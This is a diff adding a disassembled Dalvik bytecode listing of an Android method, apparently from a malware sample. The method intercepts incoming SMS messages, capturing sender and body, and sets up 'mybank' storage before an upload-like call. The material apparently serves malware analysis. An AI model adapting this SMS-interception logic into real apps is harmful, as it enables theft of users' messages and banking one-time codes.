@@ -1,0 +1,48 @@
+# Lkk/util/TK;->handleMessage(Landroid/os/Message;)V [access_flags=public]
+#
+# Parameters:
+# - local registers: v0...v6
+# - v7:android.os.Message
+#
+# - return:void
+
+handleMessage-BB@0x0 : 
+	0       (00000000) iget-object          v2, v6, Lkk/util/TK;->mContext Landroid/content/Context;
+	1       (00000004) new-instance         v3, Landroid/content/Intent;
+	2       (00000008) iget-object          v4, v6, Lkk/util/TK;->mContext Landroid/content/Context;
+	3       (0000000c) const-class          v5, Lkk/service/FUK;
+	4       (00000010) invoke-direct        v3, v4, v5, Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V
+	5       (00000016) invoke-virtual       v2, v3, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+	6       (0000001c) const-string         v2, 'SMSHandler'
+	7       (00000020) new-instance         v3, Ljava/lang/StringBuilder;
+	8       (00000024) invoke-direct        v3, Ljava/lang/StringBuilder;-><init>()V
+	9       (0000002a) const-string         v4, 'handleMessage: '
+	10      (0000002e) invoke-virtual       v3, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	11      (00000034) move-result-object   v3
+	12      (00000036) invoke-virtual       v3, v7, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
+	13      (0000003c) move-result-object   v3
+	14      (0000003e) invoke-virtual       v3, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	15      (00000044) move-result-object   v3
+	16      (00000046) invoke-static        v2, v3, Landroid/util/Log;->i(Ljava/lang/String; Ljava/lang/String;)I
+	17      (0000004c) iget-object          v0, v7, Landroid/os/Message;->obj Ljava/lang/Object;
+	18      (00000050) check-cast           v0, Lkk/util/MI;
+	19      (00000054) invoke-virtual       v0, Lkk/util/MI;->getPhone()Ljava/lang/String;
+	20      (0000005a) move-result-object   v2
+	21      (0000005c) iput-object          v2, v6, Lkk/util/TK;->snedPhone Ljava/lang/String;
+	22      (00000060) invoke-virtual       v0, Lkk/util/MI;->getBody()Ljava/lang/String;
+	23      (00000066) move-result-object   v2
+	24      (00000068) iput-object          v2, v6, Lkk/util/TK;->content Ljava/lang/String;
+	25      (0000006c) sget-object          v2, Lkk/util/SM;->CONTENT_URI Landroid/net/Uri;
+	26      (00000070) invoke-virtual       v0, Lkk/util/MI;->getId()I
+	27      (00000076) move-result          v3
+	28      (00000078) int-to-long          v4, v3
+	29      (0000007a) invoke-static        v2, v4, v5, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri; J)Landroid/net/Uri;
+	30      (00000080) move-result-object   v1
+	31      (00000082) new-instance         v2, Lkk/util/SPUtil;
+	32      (00000086) iget-object          v3, v6, Lkk/util/TK;->mContext Landroid/content/Context;
+	33      (0000008a) const-string         v4, 'mybank'
+	34      (0000008e) invoke-direct        v2, v3, v4, Lkk/util/SPUtil;-><init>(Landroid/content/Context; Ljava/lang/String;)V
+	35      (00000094) iput-object          v2, v6, Lkk/util/TK;->sp Lkk/util/SPUtil;
+	36      (00000098) invoke-direct        v6, Lkk/util/TK;->up()V
+	37      (0000009e) return-void          
+
